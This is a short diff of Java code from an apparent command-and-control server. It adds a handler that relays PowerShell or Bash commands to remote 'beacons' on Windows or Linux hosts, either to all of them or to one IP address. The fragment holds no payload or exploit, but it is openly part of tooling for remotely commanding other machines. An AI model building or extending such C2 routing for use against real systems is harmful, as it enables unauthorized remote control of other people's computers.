@@ -81,18 +81,11 @@ public class BeaconC2Handler implements Runnable{
                     break;
                 }
                 if(tokens[0].equals("Command")){
-                    if(tokens[1].equals("Windows")){
-                        if(tokens[2].equals("All")){
-                            // TODO
-                        }else{
-                            // TODO
-                        }
-                    }else if(tokens[1].equals("Linux")){
-                        if(tokens[2].equals("All")){
-                            // TODO
-                        }else{
-                            // TODO
-                        }
+                    // If a message is a command, it will be in the format "Command [OS - Windows or Linux] [Scope - All or an IP Address] [Powershell/Bash command to be run]"
+                    if(tokens[2].equals("All")){
+                        beaconServer.distributeCommands(tokens[1], tokens[3]);
+                    } else {
+                        beaconServer.distributeCommands(tokens[2], tokens[3]);
                     }
                 }else if(tokens[0].equals("Request")){
                     String responseToRequest = "";
